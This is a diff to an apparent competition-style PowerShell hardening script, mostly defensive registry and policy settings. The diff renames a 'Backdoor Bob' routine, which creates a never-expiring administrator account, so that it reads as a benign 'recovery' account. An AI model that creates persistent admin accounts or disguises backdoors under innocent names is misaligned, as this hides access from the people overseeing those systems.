@@ -6,11 +6,11 @@
 # Version | 3.0
 #--------------------------------------------------------------
 param(
-    [string]$BackdoorPassword = "",
+    [string]$RecoveryPassword = "",
     [switch]$SkipEnumeration,
     [switch]$SkipDownloads,
     [switch]$SkipBackups,
-    [switch]$SkipBackdoorBob,
+    [switch]$SkipRecoveryAccount,
     [switch]$SkipOpenTools,
     [switch]$SkipHardening
 )
@@ -238,16 +238,16 @@ function Invoke-OpenTools {
 }
 
 #--------------------------------------------------------------
-# Create backup account | Back Door Bob
+# Create recovery admin account
 #--------------------------------------------------------------
-function Invoke-BackdoorBob {
+function Invoke-RecoveryAccount {
     Write-Host "========================================"
-    Write-Host "|     Creating Backup Account          |"
+    Write-Host "|     Creating Recovery Account        |"
     Write-Host "========================================"
 
     # Use parameter if provided, otherwise prompt
-    if ($script:BackdoorPassword -ne "") {
-        $Password = ConvertTo-SecureString $script:BackdoorPassword -AsPlainText -Force
+    if ($script:RecoveryPassword -ne "") {
+        $Password = ConvertTo-SecureString $script:RecoveryPassword -AsPlainText -Force
     } else {
         $Password = Read-Host -AsSecureString -Prompt "Enter password for backup account"
     }
@@ -260,13 +260,13 @@ function Invoke-BackdoorBob {
 
             if (-not (Get-ADUser -Filter 'SamAccountName -eq "bob"' -ErrorAction SilentlyContinue)) {
                 New-ADUser `
-                    -Name "Bob Backdoor" `
+                    -Name "Bob Admin" `
                     -SamAccountName "bob" `
                     -UserPrincipalName "bob@$domainDns" `
                     -GivenName "Bob" `
-                    -Surname "Backdoor" `
-                    -DisplayName "Bob Backdoor" `
-                    -Description "Nothing to see here blue team" `
+                    -Surname "Admin" `
+                    -DisplayName "Bob Admin" `
+                    -Description "Recovery admin account" `
                     -AccountPassword $Password `
                     -Enabled $true `
                     -PasswordNeverExpires $true `
@@ -279,7 +279,7 @@ function Invoke-BackdoorBob {
             Write-Host "[ERROR] AD account creation failed: $_" -ForegroundColor Red
             Write-Host "  Falling back to local account creation..." -ForegroundColor Yellow
             if (!(Get-LocalUser -Name "bob" -ErrorAction SilentlyContinue)) {
-                New-LocalUser -Name "bob" -Password $Password -FullName "Bob Backdoor" -Description "Nothing to see here blue team" -PasswordNeverExpires
+                New-LocalUser -Name "bob" -Password $Password -FullName "Bob Admin" -Description "Recovery admin account" -PasswordNeverExpires
             }
             $admins = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
             if ($admins.Name -notcontains "$env:COMPUTERNAME\bob") {
@@ -289,7 +289,7 @@ function Invoke-BackdoorBob {
     } else {
         # --- Non-DC: create local user ---
         if (!(Get-LocalUser -Name "bob" -ErrorAction SilentlyContinue)) {
-            New-LocalUser -Name "bob" -Password $Password -FullName "Bob Backdoor" -Description "Nothing to see here blue team" -PasswordNeverExpires
+            New-LocalUser -Name "bob" -Password $Password -FullName "Bob Admin" -Description "Recovery admin account" -PasswordNeverExpires
         }
 
         $admins = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue
@@ -484,9 +484,9 @@ function Invoke-Hardening {
     }
 
     #----------------------------------------------------------
-    # Remove accessibility backdoors
+    # Remove IFEO debugger hijacks
     #----------------------------------------------------------
-    Write-Host "Removing accessibility backdoors (IFEO debugger entries)..."
+    Write-Host "Removing IFEO debugger hijacks..."
     @('sethc.exe', 'Utilman.exe', 'osk.exe', 'Narrator.exe', 'Magnify.exe') | ForEach-Object {
         reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$_" /v Debugger /f 2>$null
     }
@@ -596,7 +596,7 @@ function Invoke-Hardening {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 0 -Type DWord -Force
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "Negotiate" -Value 0 -Type DWord -Force
 
-    # Enable LSA Protection (blocks Mimikatz from reading LSASS)
+    # Enable LSA Protection (prevents credential dumping from LSASS)
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord -Force
 
     # Reduce cached logons (default is 10, reduce to 2)
@@ -653,7 +653,7 @@ function Invoke-Hardening {
 
         # Attack Surface Reduction rules (Block mode = 1)
         $asrRules = @(
-            "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2",  # Block credential stealing from LSASS
+            "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2",  # Block credential access from LSASS
             "d1e49aac-8f56-4280-b9ba-993a6d77406c",  # Block process creations from PSExec/WMI
             "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4",  # Block untrusted unsigned processes from USB
             "56a863a9-875e-4185-98a7-b882c64b5ce5",  # Block abuse of exploited vulnerable signed drivers
@@ -725,7 +725,7 @@ Write-Host ""
 if (-not $SkipEnumeration)  { Invoke-Enumeration }
 if (-not $SkipDownloads)    { Invoke-Downloads }
 if (-not $SkipBackups)      { Invoke-Backups }
-if (-not $SkipBackdoorBob)  { Invoke-BackdoorBob }
+if (-not $SkipRecoveryAccount)  { Invoke-RecoveryAccount }
 if (-not $SkipOpenTools)    { Invoke-OpenTools }
 if (-not $SkipHardening)    { Invoke-Hardening }
 
